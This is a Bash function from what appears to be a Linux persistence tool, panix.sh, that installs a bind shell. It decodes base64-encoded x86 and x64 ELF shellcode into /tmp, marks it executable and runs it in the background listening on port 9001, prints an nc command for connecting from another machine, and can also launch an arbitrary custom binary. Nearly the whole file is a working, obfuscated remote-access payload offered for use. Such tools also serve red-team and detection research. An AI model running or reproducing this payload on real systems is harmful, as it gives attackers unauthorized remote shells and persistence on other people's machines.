setup_bind_shell() {
	local default=0
	local custom=0
	local architecture=""
	local binary=""

	usage_bind_shell() {
		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
		echo "--custom                     Use custom bind shell binary"
		echo "  --binary <binary>            Specify the path to the custom binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--architecture )
				shift
				architecture=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --bind-shell --default --architecture x86"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
				exit 0
				;;
			--help|-h)
				usage_bind_shell
				exit 0
				;;
			* )
				echo "Invalid option for --bind-shell: $1"
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $architecture ]]; then
			echo "Error: --architecture (x64/x86) must be specified when using --default."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		case $architecture in
			x86 )
				echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
				chmod +x /tmp/bd86
				/tmp/bd86 &
				echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
				;;
			x64 )
				echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
				chmod +x /tmp/bd64
				/tmp/bd64 &
				echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
				;;
			* )
				echo "Error: Invalid architecture specified. Use one of x86 or x64"
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
		esac

		echo "[+] The bind shell is listening on port 9001."
		echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified when using --custom."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ ! -f $binary ]]; then
			echo "Error: Specified binary does not exist: $binary"
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		chmod +x $binary
		$binary &
		echo "[+] Custom binary $binary is executed and running in the background."

	else
		echo "Error: Either --default or --custom must be specified for --bind-shell."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi
	echo "[+] Bind shell persistence established!"
}
